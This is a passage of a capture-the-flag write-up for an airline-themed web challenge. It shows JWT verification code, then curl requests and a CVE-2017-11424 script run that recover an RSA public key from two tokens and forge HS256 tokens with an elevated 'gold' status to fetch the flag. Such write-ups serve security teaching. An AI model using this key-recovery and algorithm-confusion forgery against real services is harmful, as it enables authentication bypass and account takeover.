+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>noVerify) {
+    <span style="color:#8be9fd;font-style:italic">var</span> signingMethod <span style="color:#ff79c6">=</span> algorithmMap[algorithm <span style="color:#ff79c6">||</span> header.alg];
+    <span style="color:#8be9fd;font-style:italic">var</span> signingType <span style="color:#ff79c6">=</span> typeMap[algorithm <span style="color:#ff79c6">||</span> header.alg];
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>signingMethod <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>signingType) {
+      <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;Algorithm not supported&#39;</span>);
+    }
+
+    <span style="color:#6272a4">// verify signature. `sign` will return base64 string.
+</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">var</span> signingInput <span style="color:#ff79c6">=</span> [headerSeg, payloadSeg].join(<span style="color:#f1fa8c">&#39;.&#39;</span>);
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>verify(signingInput, key, signingMethod, signingType, signatureSeg)) {
+      <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;Signature verification failed&#39;</span>);
+    }
+
+    <span style="color:#6272a4">// Support for nbf and exp claims.
+</span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// According to the RFC, they should be in seconds.
+</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (payload.nbf <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">Date</span>.now() <span style="color:#ff79c6">&lt;</span> payload.nbf<span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span>) {
+      <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;Token not yet active&#39;</span>);
+    }
+
+    <span style="color:#ff79c6">if</span> (payload.exp <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">Date</span>.now() <span style="color:#ff79c6">&gt;</span> payload.exp<span style="color:#ff79c6">*</span><span style="color:#bd93f9">1000</span>) {
+      <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;Token expired&#39;</span>);
+    }
+  }
+
+  <span style="color:#ff79c6">return</span> payload;
+};
+
+</code></pre></div><p>The only <del>big</del> problem is that we don&rsquo;t have the public key.
+After some googling we can find <a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/">this blog post</a> which tells us that we can retrieve the public key with only two JWT.
+The author of the post has made a script that retrieve the public key and craft a new token using this public key.
+So let&rsquo;s try this script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ <span style="color:#6272a4"># get 2 jwt</span>
+$ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;aa&#34;,&#34;lastName&#34;:&#34;aaa&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:{&#34;a&#34;:{&#34;sssr&#34;:&#34;FQTU&#34;}, &#34;constructor&#34;:{&#34;name&#34;:&#34;Array&#34;}}}&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg&#34;</span><span style="color:#ff79c6">}</span>
+$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg&#39;</span> &gt; jwt1
+$
+$ <span style="color:#6272a4"># we can modify the ffp to get another jwt</span>
+$ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;aa&#34;,&#34;lastName&#34;:&#34;aaa&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:{&#34;a&#34;:{&#34;sssr&#34;:&#34;FQTU&#34;}, &#34;constructor&#34;:{&#34;name&#34;:&#34;Array&#34;}}}&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc3In0.HHZJIyx1hmJtTNN0c7TyJGGVuiSMbg9tKrkC_R5JUYY8CHw0Oz8SVyeg9g3GNvQ32XFpOXMkKCHbfQi5gS9lSECjBa7t4npwOz50YDZ0owPVTQPiyqBPeTLuKkmA-fO4CiLvMn4zcm2ftFeDn6aQ6hZyp01oqN2bX09hEvGclmqY5huAzeLvPH9ZjtPOyyYNEuKJ0uIbawABBOFy2mI9xxEB16sYeDOnuIiNDjzzgiiZdr4vvB4B5iv7PYsqVMuI3XB035JjjHJZzMP19h2oQcpG7yLRRp1L6yzEDDIDUJYjicDat6L10Zv7MbPk6Z8E_2LD6YstslJCqWWol-JgiA&#34;</span><span style="color:#ff79c6">}</span>
+$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc3In0.HHZJIyx1hmJtTNN0c7TyJGGVuiSMbg9tKrkC_R5JUYY8CHw0Oz8SVyeg9g3GNvQ32XFpOXMkKCHbfQi5gS9lSECjBa7t4npwOz50YDZ0owPVTQPiyqBPeTLuKkmA-fO4CiLvMn4zcm2ftFeDn6aQ6hZyp01oqN2bX09hEvGclmqY5huAzeLvPH9ZjtPOyyYNEuKJ0uIbawABBOFy2mI9xxEB16sYeDOnuIiNDjzzgiiZdr4vvB4B5iv7PYsqVMuI3XB035JjjHJZzMP19h2oQcpG7yLRRp1L6yzEDDIDUJYjicDat6L10Zv7MbPk6Z8E_2LD6YstslJCqWWol-JgiA&#39;</span> &gt; jwt2
+$
+$
+$ python3 x_CVE-2017-11424.py <span style="color:#f1fa8c">`</span>cat jwt1<span style="color:#f1fa8c">`</span> <span style="color:#f1fa8c">`</span>cat jwt2<span style="color:#f1fa8c">`</span>
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> GCD:  0x1
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> GCD:  0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found n with multiplier <span style="color:#bd93f9">1</span>  :
+ 0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Written to c3995f664ac0cc18_65537_x509.pem
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Tampered JWT: b<span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y&#39;</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Written to c3995f664ac0cc18_65537_pkcs1.pem
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Tampered JWT: b<span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE&#39;</span>
+
+</code></pre></div><p>If we try with the first JWT, it seems that the token is valid but because we didn&rsquo;t set the <code>status</code> to <code>gold</code> we will not get the flag :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ curl -X POST <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/upgrades/flag&#39;</span> -H <span style="color:#f1fa8c">&#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You do not qualify for this upgrade at this time. Please fly with us more.&#34;</span><span style="color:#ff79c6">}</span>
+
+</code></pre></div><p>As contrary, we get an error with the second JWT :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ curl -X POST <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/upgrades/flag&#39;</span> -H <span style="color:#f1fa8c">&#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;Token is not valid.&#34;</span><span style="color:#ff79c6">}</span>
+
+</code></pre></div><p>We just have to take a look at the script and modify it to set <code>status</code> to <code>gold</code> and get the flag :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ vim x_CVE-2017-11424.py
+$ cat x_CVE-2017-11424.py
+<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
+<span style="color:#6272a4"># payload[&#39;exp&#39;] = int(time.time())+86400 # comment this</span>
+payload<span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;status&#34;</span><span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;gold&#34;</span>                <span style="color:#6272a4"># add this</span>
+<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
+
+$ python3 x_CVE-2017-11424.py <span style="color:#f1fa8c">`</span>cat jwt1<span style="color:#f1fa8c">`</span> <span style="color:#f1fa8c">`</span>cat jwt2<span style="color:#f1fa8c">`</span>
+<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Tampered JWT: b<span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8&#39;</span>
+
+$ curl -X POST <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/upgrades/flag&#39;</span> -H <span style="color:#f1fa8c">&#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;union{I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}&#34;</span><span style="color:#ff79c6">}</span>
+
+</code></pre></div><p>FLAG : <code>union{I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}</code></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
